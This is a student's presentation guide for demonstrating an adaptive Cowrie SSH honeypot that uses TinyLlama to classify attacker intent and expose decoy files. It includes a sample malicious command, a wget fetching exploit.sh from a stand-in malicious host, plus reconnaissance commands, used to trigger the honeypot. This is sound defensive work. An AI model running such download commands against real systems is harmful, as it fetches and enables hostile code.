# Final Presentation Guide: Adaptive SSH Honeypot

Follow these steps to demonstrate your project successfully during your final presentation.

## 1. Preparation (Before Sir arrives)
1. **Ensure Ollama is running**:
   - The LLM engine must be active for intent analysis.
   - Run `ollama list` to check if `tinyllama` is available.
2. **Clear previous logs (Optional but recommended for a clean demo)**:
   ```bash
   # Clear adaptive logs
   rm var/log/adaptive/*.log
   # Clear Cowrie logs
   truncate -s 0 var/log/cowrie/cowrie.json
   ```

## 2. Start the System
Open two terminals on your laptop:

### Terminal 1: Cowrie SSH Honeypot
```bash
cd /home/dhikshanya06/cowrie
bin/cowrie start
```

### Terminal 2: Adaptive Intelligence Engine
```bash
cd /home/dhikshanya06/cowrie
./run_live_controller.sh
```
*Leave this terminal visible on the side—it will show the "Adaptive Decisions" as you type commands.*

## 3. The Demonstration Flow

### Phase 1: Normal Behavior (Scenario A)
1. **Connect to the honeypot** from a third terminal (or another machine):
   ```bash
   ssh root@localhost -p 2222
   ```
2. **Run normal commands**:
   ```bash
   ls
   pwd
   whoami
   exit
   ```
3. **Show the Result**:
   - Point to the **Adaptive Controller terminal**. It should identify this as "Level 1 / Normal".
   - Show that `/home/dhikshanya06/cowrie/var/log/adaptive/normal_activity.log` has a new entry.

### Phase 2: Malicious Behavior (Scenario B)
1. **Connect again**:
   ```bash
   ssh root@localhost -p 2222
   ```
2. **Run malicious commands**:
   ```bash
2. **Execute Malicious Commands** (to trigger LLM escalation):
   ```bash
   # Try downloading a script (Simulates "Fake Success")
   wget http://malicious-site.com/exploit.sh

   # Try system discovery
   uname -a
   ifconfig
   ```
3. **Observe "Progressive Deception" in Action**:
   ```bash
   ls
   ```
   - **Expectation (Level 2/3)**: Now you see `backup.tar.gz`, `.db_creds`, and `.ssh/`. The honeypot has "exposed" more interesting files to trap the attacker.
4. **Read Deceptive Artifacts**:
   ```bash
   cat .db_creds
   ```
   - **Expectation**: Shows mock database credentials.
5. **Analyze the Controller Output**:
   - Point to the **Adaptive Intelligence Engine** terminal. It will show the LLM's explanation of why it escalated the system to Level 3.

## 4. Key Viva Points (What to say)
- **Progressive Deception**: "Our system uses a Progressive Deception model. Instead of breaking command logic, it gradually exposes high-value artifacts as it detects malicious intent, making the honeypot more realistic and harder to detect."
- **Fake Command Success**: "For commands like `wget`, we provide fake success feedback at high interaction levels. This traps the attacker in a loop where they believe their tools are working, while we gain valuable intelligence."
- **LLM-Guided Intelligence**: "The LLM (TinyLlama) provides semantic reasoning to justify why the interaction level shifted. It understands that `wget` combined with `uname` indicates a directed malware attack, not just random curiosity."
- **Institutional Realism**: "By focusing on file-system exposure and believable feedback, we avoid the 'sudden behavior change' trap that often alerts attackers to the presence of a honeypot."


**Good luck with your presentation!**
